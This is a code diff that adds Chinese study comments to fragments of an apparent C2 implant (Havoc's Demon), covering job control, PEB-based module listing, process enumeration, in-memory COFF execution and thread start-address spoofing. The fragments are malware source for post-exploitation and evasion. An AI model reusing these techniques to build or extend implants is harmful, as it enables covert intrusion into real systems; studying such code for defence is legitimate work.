@@ -180,10 +180,12 @@ VOID CommandSleep( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
+// Job相关的命令，包含了Job的创建，删除，挂起，恢复等子命令
 VOID CommandJob( PPARSER Parser )
 {
     PUTS( "Job" )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
+    // Command是Job的命令，比如list，suspend等
     DWORD    Command = ParserGetInt32( Parser );
 
     PackageAddInt32( Package, Command );
@@ -265,6 +267,8 @@ VOID CommandProc( PPARSER Parser )
 
     switch ( SubCommand )
     {
+        // 从Peb中的InMemoryOrderLinks链表中获取所有的模块
+        // 通过NtQueryInformationProcess的ProcessBasicInformation获取进程的基本信息，然后获取PEB
         case 2: PUTS("Proc::Modules")
         {
             PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
@@ -274,6 +278,7 @@ VOID CommandProc( PPARSER Parser )
             NTSTATUS                  NtStatus         = STATUS_SUCCESS;
             OBJECT_ATTRIBUTES         ObjAttr          = { sizeof( OBJECT_ATTRIBUTES ) };
 
+            // 获取进程ID
             if ( Parser->Length > 0 )
                 ProcessID = ParserGetInt32( Parser );
             else
@@ -334,6 +339,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
+        // 获取了进程的基本信息
         case 3: PUTS("Proc::Grep")
         {
             PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
@@ -1064,6 +1070,7 @@ VOID CommandInlineExecute( PPARSER Parser )
 
     switch ( Flags )
     {
+        // COFFLOAD，通过VEH来执行
         case 0:
         {
             PUTS( "Use Non-Threaded CoffeeLdr" )
@@ -1075,6 +1082,7 @@ VOID CommandInlineExecute( PPARSER Parser )
             break;
         }
 
+        // 与上一个一样，但是是通过线程来执行
         case 1:
         {
             PUTS( "Use Threaded CoffeeRunner" )
@@ -1082,6 +1090,7 @@ VOID CommandInlineExecute( PPARSER Parser )
             break;
         }
 
+        // 上面两个的整合，根据当前的配置来决定是否使用线程来运行
         default:
         {
             PUTS( "Use default (from config) CoffeeLdr" )
@@ -1662,6 +1671,7 @@ VOID CommandAssemblyListVersion( VOID )
     PackageTransmit( Package, NULL, NULL );
 }
 
+// 只是调整了参数的值
 VOID CommandConfig( PPARSER Parser )
 {
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_CONFIG );
@@ -1676,6 +1686,8 @@ VOID CommandConfig( PPARSER Parser )
             break;
         }
 
+        // 动态加载Instance.Config.Implant.ThreadStartAddr
+        // 自定义线程入口，从模块找到函数，然后加上偏移ThreadAddr + Offset
         case DEMON_CONFIG_IMPLANT_SPFTHREADADDR:
         {
             DWORD   LibSize    = 0;
